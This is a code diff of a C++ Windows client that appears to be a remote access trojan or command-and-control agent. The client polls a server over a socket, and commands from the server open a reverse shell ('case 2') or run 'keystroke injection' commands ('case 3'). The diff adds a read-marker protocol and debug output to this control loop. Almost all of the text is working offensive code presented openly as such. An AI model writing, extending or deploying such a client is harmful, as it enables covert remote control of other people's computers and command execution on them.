@@ -4,7 +4,6 @@
 #include <Windows.h>
 #include <string>
 #include <thread>
-#include <atomic>
 #include <sstream>                                                              // Include for stringstream
 
 using namespace std;
@@ -34,44 +33,70 @@ int main()
     while(outerloop)
     {
         connected = socket_setup(sock);
-
+        cout<< "here";
         //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
         bool loop = true;
         while(loop)
         {
-            switch (receive_data(sock,"from_server.txt")[0])
+            if(receive_data(sock,"from_server.txt")[0] == '`')
             {
-                case '2':                                                                                     //rev shell
+                Sleep(1000);
+                cout<< "waiting for data " << endl;
+            }
+            else
+            {
+                switch (receive_data(sock,"from_server.txt")[0])
                 {
-                    rev_shell(sock);
-                    break;
-                }
+                    case '2':                                                                                     //rev shell
+                    {
+                        send_data(sock,"from_server.txt","`");                                                    //mark the file read(switch)
+                        cout << "mark the file read [switch] inside case 2" << endl;
+                        
+                        rev_shell(sock);
+                        break;
+                    }
 
-                case '3':                                                                                     //keystroke injection
-                {                
-                    ExecuteCommand(receive_data(sock,"from_server.txt"));
-                    break;
-                }
+                    case '3':                                                                                     //keystroke injection
+                    {   
+                        send_data(sock,"from_server.txt","`");                                                    //mark the file read(switch)   
+                        cout << "mark the file read [switch] inside case 3" << endl;
+                        
+                        ExecuteCommand(receive_data(sock,"from_server.txt"));
+                        cout << "mark the file read [switch] inside case 3 (for execute command)" << endl;
+                        send_data(sock,"from_server.txt","`");
+                        cout << "mark the file read (for execute command)" << endl;
+                        break;
+                    }
 
-                case '~':                                                                                    //dc from server
-                {
-                    std::cout << "Server initiated disconnect.\n";
-                    loop = false;
-                    connected = false;
-                    
-                    break;
-                }
-                case '#':                                                                                    //end all
-                {
-                    loop = false;
-                    outerloop = false;
-                    
-                    break;
-                }
-                default:
-                {
-                    break;
+                    case '~':                                                                                    //dc from server
+                    {
+                        send_data(sock,"from_server.txt","`");                                                    //mark the file read(switch)
+                        cout << "mark the file read [switch] inside case ~" << endl;
+                        
+                        std::cout << "Server initiated disconnect.\n";
+                        loop = false;
+                        connected = false;
+                        
+                        break;
+                    }
+                    case '#':                                                                                    //end all
+                    {
+                        send_data(sock,"from_server.txt","`");                                                    //mark the file read(switch)
+                        cout << "mark the file read [switch] inside case #" << endl;
+                        
+                        loop = false;
+                        outerloop = false;
+                        
+                        break;
+                    }
+                    default:
+                    {
+                        send_data(sock,"from_server.txt","`");                                                    //mark the file read(switch)
+                        cout << "mark the file read [switch] inside default" << endl;
+                        
+                        break;
+                    }
                 }
             }
         }
@@ -255,8 +280,10 @@ string receive_data(SOCKET &clientSocket, const string &filename)
         }
         body = unchunkedBody;
     }
-    return body;
     safe_closesocket(clientSocket);
+
+    //send_data(clientSocket, "from_server.txt", "`");
+    return body;
 }
 
 void rev_shell(SOCKET &clientSocket)
@@ -332,6 +359,7 @@ void rev_shell(SOCKET &clientSocket)
         while (!processFinished.load())  // Check if process is finished
         {
             cmd = receive_data(clientSocket, "from_server.exe");
+            send_data(clientSocket,"from_server.txt","`");
             if (cmd == "exit")
             {
                 processFinished.store(true); // Signal to stop reading thread
